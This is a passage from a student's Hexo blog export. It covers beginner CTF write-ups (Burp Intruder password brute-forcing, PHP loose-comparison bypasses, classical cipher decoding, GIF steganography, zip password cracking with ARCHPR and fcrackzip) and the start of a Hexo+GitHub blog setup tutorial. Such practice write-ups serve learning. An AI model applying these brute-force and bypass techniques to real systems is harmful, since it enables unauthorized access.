src="https://img-blog.csdnimg.cn/2020032213154036.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>用字典爆破吗？不过我好想没有字典，去网上找一个吧。<br>找到字典后，burp抓包<br><img src="https://img-blog.csdnimg.cn/20200322132337101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>send   to intruder进行爆破<br><img src="https://img-blog.csdnimg.cn/20200322132440244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>添加字典。<br><img src="https://img-blog.csdnimg.cn/20200322133013884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>很快就爆出来密码了。试一下。拿flag。<br><img src="https://img-blog.csdnimg.cn/20200322133157631.png" alt="Augenstern" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200322133335728.png" alt="Augenstern" loading="lazy"><br>事实证明，<code>0123456</code>和<code>123456</code>都行。</p><h5 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h5><p><img src="https://img-blog.csdnimg.cn/20200322133456948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>刚学了PHP，正好拿来练手<br><img src="https://img-blog.csdnimg.cn/20200322134223544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>分析题中的代码，应该是让用get方式提交，<br>代码<code>$a==0 and $a</code>给a复制为0，且a为true。a赋值1并存在就能打印出来第一段flag。那就给a赋值为0吧<br><img src="https://img-blog.csdnimg.cn/20200322134639633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>果然没错，先记下来。再看下面的代码<br>is_numeric意思是数字，这里就是，如果b为数字的话，就什么也没有。<code>$b&gt;1234 </code>打印$flag2,就是b要赋值的话要满足大于1234同时还不能是数字。这里我用1235j<br><img src="https://img-blog.csdnimg.cn/20200322135216611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>得到第二段flag.</p><h5 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h5><p><img src="https://img-blog.csdnimg.cn/20200322160923900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>混合编码就是好几种加密连环套<br>第一种=&gt;base64解密<br><img src="https://img-blog.csdnimg.cn/20200322161135568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第二种=&gt;解出的是Unicode编码，再转换<br><img src="https://img-blog.csdnimg.cn/20200322161236896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第三种=&gt;解出来还是base64,再去base64 转换<br><img src="https://img-blog.csdnimg.cn/20200322161407526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第四步=&gt;解出来看着是ascii码，可以去Excel表格里转换比较快。<br>flag就是<code>welcometoattackanddefenceworld</code><br><strong>变异凯撒</strong><br><img src="https://img-blog.csdnimg.cn/20200322162655961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>题目是这么说的<br><img src="https://img-blog.csdnimg.cn/20200322162741411.png" alt="Augenstern" loading="lazy"><br>想想，从a=&gt;f转换一下试试<br><img src="https://img-blog.csdnimg.cn/20200322162834546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>f是出来了，但是第二位是k，不是我们预想的l。这就是变异的凯撒是吗。。。。。。k和l差了1位，E和g差了2位，好像有点规律。递归吧………………嗦嘎。<br><img src="https://img-blog.csdnimg.cn/20200322163604622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>还好C语言还能用，哈哈哈</p><p><strong>Quoted-printable</strong><br><img src="https://img-blog.csdnimg.cn/20200322164655608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个加密没见过，不过比较简单<br><img src="https://img-blog.csdnimg.cn/20200322164756583.png" alt="Augenstern" loading="lazy"><br>果然是我没见过的，对于我来说是一个新的加密。然后我直接复制这段密码找度娘去了，<br><img src="https://img-blog.csdnimg.cn/20200322164936668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看着这么多，没想到的是被度娘耍了。点了之后就直接下载了一个Word文档，一点都不是说密码的。<br>还是直接搜密码的名字靠谱，然后先看原理<a href="https://baike.baidu.com/item/quoted_printable_decode/9714081?fr=aladdin">Quoted-printable百度百科</a>这个理解不是很清楚，还有网上有好多师傅们都写了关于这个密码的介绍<br>我看这个博客介绍的很好，<a href="http://blog.chacuo.net/494.html">师傅博客</a>。<br>然后就可以找在线解密工具解题了。<br><img src="https://img-blog.csdnimg.cn/20200322165835766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag还有中文的，长见识。</p><h5 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h5><p><strong>金三胖</strong><br><img src="https://img-blog.csdnimg.cn/20200322170410910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>是个表情包，GIF动图。<br><img src="https://img-blog.csdnimg.cn/20200322170644695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>哈哈哈，我手动截图没想到就截到了一个hhh.<br><img src="https://img-blog.csdnimg.cn/20200322170339802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我感觉这道题都不用工具了，Snipaste截图就是非常强。<br>还是用工具吧，🤣🤣🤣🤣<br>这个应该就是用stegsolve，<br>打开后<br><img src="https://img-blog.csdnimg.cn/20200322171307172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后点Analyse=&gt;frame Browser<br><img src="https://img-blog.csdnimg.cn/20200322171523118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后就可以一帧一帧调了<br><img src="https://img-blog.csdnimg.cn/20200322171652666.png" alt="Augenstern" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200322171724994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200322171752169.png" alt="Augenstern" loading="lazy"><br>OK了，，flag到手。注意he11o不是hello，我填了好几遍才反应过来🤣🤣🤣<br>关于这个工具怎么用，具体的可以看看这位师傅的博客，他专门写了一篇博客为小白讲解了这个工具的使用方法。<a href="https://www.cnblogs.com/cat47/p/11483478.html">stegsolve使用方法</a><br><strong>二维码</strong><br><img src="https://img-blog.csdnimg.cn/20200322173803226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开压缩包，里面是个二维码，扫一下发现有内容，但不是flag，然后我就先用stegsolve里变一下，扫一下，扫完了，还是那个内容。放弃………………<br>这个先拖进winhex里看看发现有压缩包<br><img src="https://img-blog.csdnimg.cn/20200322175709833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>提取出来就行，提取可以使用binwalk或者foremost，binwalk是kali里的工具在kali里使用比较方便，Windows也可以装，就是太麻烦，我这里windows使用的是foremost<br><img src="https://img-blog.csdnimg.cn/20200322180135793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200322180216917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这就是分离出来的文件夹<br><img src="https://img-blog.csdnimg.cn/20200322180347296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>分离出了一张png图片和一个压缩包<br>不过压缩包有密码的，这个需要去破解压缩包的密码<br><img src="https://img-blog.csdnimg.cn/20200322180557642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我用ARCHPR爆破，直接爆出来了密码7639<br>然后打开压缩包里的TXT文本<br><img src="https://img-blog.csdnimg.cn/20200322180803544.png" alt="Augenstern" loading="lazy"><br>拿到flag。<br>还有一种方法，使用binwalk，这个需要kali了<br>我安装好kali还没用过呢，今天来试试……<br><img src="https://img-blog.csdnimg.cn/20200322184244240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我已经拖进来了（下载vmtools就行，真方便），并且重命名了这个，<br>kali不需要下载binwalk，直接用，<br><img src="https://img-blog.csdnimg.cn/20200322184924663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>原谅我愚蠢的打开方式，因为我真的不会那些命令，回头再学，<br><img src="https://img-blog.csdnimg.cn/20200322185920803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>用fcrackzip来爆破密码，fcrackzip可以暴力破解zip密码，对弱密码非常有效；<br><img src="https://img-blog.csdnimg.cn/20200322192346332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>没找到，，，，，emmmmmmm，我是按照师傅们的步骤来的啊，奇怪。那就回头在研究，先把物理机里分离出来的压缩包拖到虚拟机里，然后再拖到终端，试试，我jio得可行<br><img src="https://img-blog.csdnimg.cn/20200322192627359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>有，啊哈哈。破解出来了。跟第一个方法破解出来的一模一样，hhh，可以打开压缩包。拿到flag了。<br>不行了，我不写了。累死了，一下午了，我肝疼，不能写了，就两道吧。感慨一句，kali真是个好东西。不枉我十二个小时奋战把它搞出来，没让我失望。kali牛皮！</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建hexo+Github个人博客及遇到的问题</title>
      <link href="/posts/4867eb/"/>
      <url>/posts/4867eb/</url>
      
        <content type="html"><![CDATA[<p>在假期期间，我尝试搭建自己的博客，网上有各种视频教程，我是跟着学长给我推荐的B站上教程一步一步做的，我也看了学长之前搭建时的笔记。我在搭建时也遇到了问题，然后我都记录了下来，做个笔记吧。</p><h3 id="（1）安装node-js"><a href="#（1）安装node-js" class="headerlink" title="（1）安装node.js"></a>（1）安装node.js</h3><p>到官网去下载<code>12.14.1 LTS</code>版本的，下载好之后，在文件中打开<code>Node.js Setup</code> 。一直选择<strong>next</strong>到结束。这里提示一下，最好不要改路径，<strong>一直点next就行</strong>，如果自己改路径的话，<strong>有可能会出错</strong>，所以保险起见还是不要更改它的默认路径了。安装好之后打开<strong>cmd</strong>输入<code>node -v</code></p><pre class="language-css" data-language="css"><code class="language-css"><span class="token property">C</span><span class="token punctuation">:</span>\Users\18101>node -vv12.14.1</code></pre><p>好了，这就算安装成功了。</p><h3 id="创建一个github账户"><a href="#创建一个github账户" class="headerlink" title="创建一个github账户"></a>创建一个github账户</h3><p>进入github官网<br>把username,email,password,填写过后注册就可以了，Username自己随便设置，能记住就行，一般都是用英文字母。账户创建完成后，点<code>Create a new repository</code>创建一个新仓库。<img src="https://img-blog.csdnimg.cn/20200129210415671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>Repository name格式推荐写成<code>username.github.io</code>例如<code>zxcv0221.github.io</code><br>记得把Initialize this repository with a README前面的框点上对勾。然后点下面的绿色框<code>Create repository</code>就创建成功了。<br>然后在github创建第一个新的项目，根据网上大佬的视频教程，我跟着做，前面没什么错误，但是后面最后一步出错了，页面是下面的图：<img src="https://img-blog.csdnimg.cn/20200118105029128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>项目创建好了就是上面那个样子，我这一步还是没错的，但是我跟着教程上所说的“复制我的链接”也就是<code>用户名.github.io</code>我看到视频中的是直接粘到浏览器上打开，但是我跟着做却打不开网页，<img src="https://img-blog.csdnimg.cn/20200118105805704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>出错了，我看学长的博客里写到这一点了，他当时遇到的问题也是打不开网页，他那个情况估计是网站有延迟，所以解决办法就是等，他的网页在第二天就可以打开了。但我的这个又不一样了，我同样是尝试他的办法，结果还是不行，我就把那个新建的库删了重新建，如此六遍，都没有得到我想要的结果，然后就去百度，各种浏览器都试试，还是没成功，然后我加了一个群去问群里的大佬，过程是非常曲折，好在最后解决了，其实也很简单，就是在链接的前面加上<code>https://</code>就可以打开了。<br>综上有三种情况，1.慢慢等，2.删了重建，所有步骤再来一遍。3.就是在前面加<code>https://</code>。<br>这个答案虽然简单，但对于像我这样的小白来说，也可能会考虑不到，所以就写了出来。</p><h5 id="删库方法"><a href="#删库方法" class="headerlink" title="删库方法"></a>删库方法</h5><p>这个过程可能需要多次尝试，这样就避免不了删库，但是我不会删库，果然伟大的度娘是可以解决任何“疑难杂症”的。<br>第一步，点击<strong>Settings</strong><img src="https://img-blog.csdnimg.cn/20200130012258168.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>第二步，向下滑到最底端找到Delete the repository，点击就可以删除这个库了。<img src="https://img-blog.csdnimg.cn/20200130012505232.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h3 id="安装git-for-windows"><a href="#安装git-for-windows" class="headerlink" title="安装git for windows"></a>安装git for windows</h3><p>仍然是去官网下载安装包，下载过程可能会非常慢，耐心等待。下载完毕后安装，老规矩就别改路径了，避免不必要的麻烦，记住千万不要一直点next，先看看，安装过程中有一步是，<code>Use windows default console window</code>这个要选上。其他倒没什么，只需next 就行了。安装完毕后打开cmd输入git</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token property">C</span><span class="token punctuation">:</span>\Users\18101>git<span class="token property">usage</span><span class="token punctuation">:</span> git [--version] [--help] [-C &lt;path>] [-c &lt;name>=&lt;value>]           [--exec-path[=&lt;path>]] [--html-path] [--man-path] [--info-path]           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]           [--git-dir=&lt;path>] [--work-tree=&lt;path>] [--namespace=&lt;name>]           &lt;command> [&lt;args>]These are common Git commands used in various <span class="token property">situations</span><span class="token punctuation">:</span>start a working area <span class="token punctuation">(</span>see <span class="token property">also</span><span class="token punctuation">:</span> git help tutorial<span class="token punctuation">)</span>   clone      Clone a repository into a new directory   init       Create an empty Git repository or reinitialize an existing onework on the current change <span class="token punctuation">(</span>see <span class="token property">also</span><span class="token punctuation">:</span> git help everyday<span class="token punctuation">)</span>   add        Add file contents to the index   mv         Move or rename a file<span class="token punctuation">,</span> a directory<span class="token punctuation">,</span> or a symlink   reset      Reset current HEAD to the specified state   rm         Remove files from the working tree and from the indexexamine the history and state <span class="token punctuation">(</span>see <span class="token property">also</span><span class="token punctuation">:</span> git help revisions<span class="token punctuation">)</span>   bisect     Use binary search to find the commit that introduced a bug   grep       Print lines matching a pattern   log        Show commit logs   show       Show various types of objects   status     Show the working tree statusgrow<span class="token punctuation">,</span> mark and tweak your common history   branch     List<span class="token punctuation">,</span> create<span class="token punctuation">,</span> or delete branches   checkout   Switch branches or restore working tree files   commit     Record changes to the repository   diff       Show changes between commits<span class="token punctuation">,</span> commit and working tree<span class="token punctuation">,</span> etc   merge      Join two or more development histories together   rebase     Reapply commits on top of another base tip   tag        Create<span class="token punctuation">,</span> list<span class="token punctuation">,</span> delete or verify a tag object signed with GPGcollaborate <span class="token punctuation">(</span>see <span class="token property">also</span><span class="token punctuation">:</span> git help workflows<span class="token punctuation">)</span>   fetch      Download objects and refs from another repository   pull       Fetch from and integrate with another repository or a local branch   push       Update remote refs along with associated objects<span class="token string">'git help -a'</span> and <span class="token string">'git help -g'</span> list available subcommands and someconcept guides. See <span class="token string">'git help &lt;command>'</span> or <span class="token string">'git help &lt;concept>'</span>to read about a specific subcommand or concept.</code></pre><p>会出现这些，这就代表已经安装完了。</p><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>由于后面要用到一些插件，所以干脆就提前安装吧，这里需要安装的插件是<strong>hexo-deployer-git</strong><br>打开cmd输入<code>npm install hexo-deployer-git --save</code>就可以安装了。</p><h3 id="配置github-ssh"><a href="#配置github-ssh" class="headerlink" title="配置github ssh"></a>配置github ssh</h3><p>在你下载git for Windows的文件夹中找到并打开git-base.exe,在命令行输入<code>ssh-keygen -t rsa -C &quot;你的邮箱&quot;</code>然后一直按回车。<br>然后打开GitHub官网，点击头像，点击Settings,再点击SSH and GOG keys,点击NEW SSH KEY ,title的名字就是你的用户名，然后key的话，根据路径<code>C:\Users\用户名\.ssh</code>，用记事本打开<code>id_rsa.pub</code>这个文件,把里面的代码复制并粘贴到key上就🆗了。</p><h3 id="本地安装hexo"><a href="#本地安装hexo" class="headerlink" title="本地安装hexo"></a>本地安装hexo</h3><p>本地安装hexo前，应该先创建一个新文件夹，这个文件夹建议设在D盘下，因为搭建一次可能不成功，需要删除重新来，文件名字可以随便起。然后打开cmd，输入</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token property">C</span><span class="token punctuation">:</span>\Users\18101><span class="token property">D</span><span class="token punctuation">:</span><span class="token property">D</span><span class="token punctuation">:</span>\>cd blog<span class="token property">D</span><span class="token punctuation">:</span>\blog></code></pre><p>这样就就进入到这个文件夹里了，再输入一条这样的命令<code>npm install hexo-cil -g</code>就可以安装hexo了，安装好之后再输入命令<code>hexo init 博客昵称</code>，等待加载完毕后，输入<code>cd 博客名</code>，再进入你的文件夹。输入<code>npm install</code>好了，现在就静等安装就🆗了。<br>安装好了可以运行一下试试，再输入<code>hexo  s</code>看看有没有出现</p><pre class="language-css" data-language="css"><code class="language-css">INFO  Start processingINFO  Hexo is running at <span class="token property">http</span><span class="token punctuation">:</span>//<span class="token property">localhost</span><span class="token punctuation">:</span>4000/. Press Ctrl+C to stop.</code></pre><p>然后，复制这个链接在浏览器中打开，如果有画面，就证明已经成功了。（因为我当时做的时候没有截图，不过只要是出现画面了，就是成功了。）</p><h3 id="文本编译器下载"><a href="#文本编译器下载" class="headerlink" title="文本编译器下载"></a>文本编译器下载</h3><p>一个好的文本编译器是很重要的，编译器有好多种，大家可以根据自己的喜好来选择。我用的是sublime ，下载的话，去官网下载就行了，过程可能有点慢。<br>下载好之后，打开hexo 所在的文件，把它直接拖进sublime里面，像这样。<br><img src="https://img-blog.csdnimg.cn/2020013100430973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>现在，找到<code>/* _config.yml</code>,打开这个文件，往下滑到最底端，<br><img src="https://img-blog.csdnimg.cn/20200131005627268.png" alt="在这里插入图片描述" loading="lazy"><br>根据自己的个人信息改成这个格式就可以了，我的是已经改过的。<br>还有一处是需要改的，</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">16</span><span class="token operator">|</span>url: http://zxcv0221.github.io</code></pre><p>改完之后记得保存。<br>打开cmd输入<code>hexo g</code>回车，等到可以再次输入时，输入<code>hexo d</code>,到这里上面下载的插件就起到作用了。这个过程比较慢，耐心等待。<br>然后再输入</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span>  config --global user.email <span class="token string">"你的邮件"</span><span class="token function">git</span>  config --global user.name <span class="token string">"你的用户名"</span>再输入 hexo d就会弹出一个登录界面，输入个人的用户名和密码就可以了。</code></pre><p>这里一般情况下就算完成了，emmmmm,进行顺利的话就可以进入自己的博客了。<br>但是我的跟这个不一样，我的输入<code>hexo d</code>后是这样的：<img src="https://img-blog.csdnimg.cn/2020020101181537.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>上面说<code>fatal:unable to auto-detect email address</code>然后我就上百度查，解决方法如下：<br>1.打开“此电脑”——&gt;点击“查看”——&gt;勾选“隐藏的文件名”<br><img src="https://img-blog.csdnimg.cn/20200201012648597.jpg" alt="在这里插入图片描述" loading="lazy"><br>2.进入我们博客目录的“.deploy_git.git”子目录，找到config文件。<br>3.打开config文件，添加下面的内容</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token number">1</span><span class="token operator">|</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token number">2</span><span class="token operator">|</span>     email<span class="token operator">=</span>你的邮箱<span class="token number">3</span><span class="token operator">|</span>     name<span class="token operator">=</span>Github用户名</code></pre><p>保存即可，到这里问题就解决了。</p><h4 id="hexo-d后出现-ERROR-Deployer-not-found-git"><a href="#hexo-d后出现-ERROR-Deployer-not-found-git" class="headerlink" title="hexo d后出现    ERROR Deployer not found: git"></a>hexo d后出现    ERROR Deployer not found: git</h4><pre class="language-go" data-language="go"><code class="language-go">$ hexo dERROR Deployer not found<span class="token punctuation">:</span> git</code></pre><p>只需输入</p><pre class="language-go" data-language="go"><code class="language-go">npm install <span class="token operator">--</span>save hexo<span class="token operator">-</span>deployer<span class="token operator">-</span>git</code></pre><p>即可解决。</p><h4 id="更换博客主题"><a href="#更换博客主题" class="headerlink" title="更换博客主题"></a>更换博客主题</h4><p>刚建好的hexo博客主题是默认的，我们需要修改这个主题，hexo有很多主题，可以挑一个自己喜欢的。<a href="https://hexo.io/zh-cn/docs/setup">可以点击这里挑hexo主题</a><br>以Annie主题为例<br>1.下载主题<br>找到hexo文件所在的位置，找到themes，右键单击，选择在<code>Git Bash Here</code>打开。<br><img src="https://img-blog.csdnimg.cn/2020020118125823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后输入<code>git clone 主题链接</code>可以下载主题，我这里就是</p><pre class="language-go" data-language="go"><code class="language-go">$ git clone https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Sariay<span class="token operator">/</span>hexo<span class="token operator">-</span>theme<span class="token operator">-</span>Annie<span class="token punctuation">.</span>git</code></pre><p>等待安装。然后可以查看一下</p><pre class="language-go" data-language="go"><code class="language-go">$ lshexo<span class="token operator">-</span>theme<span class="token operator">-</span>Annie<span class="token operator">/</span>  landscape<span class="token operator">/</span></code></pre><p>3.然后修改你博客根目录下的_config.yml文件里的theme配置来更换使用的主题</p><pre class="language-go" data-language="go"><code class="language-go"># Extensions## Plugins<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>hexo<span class="token punctuation">.</span>io<span class="token operator">/</span>plugins<span class="token operator">/</span>## Themes<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token 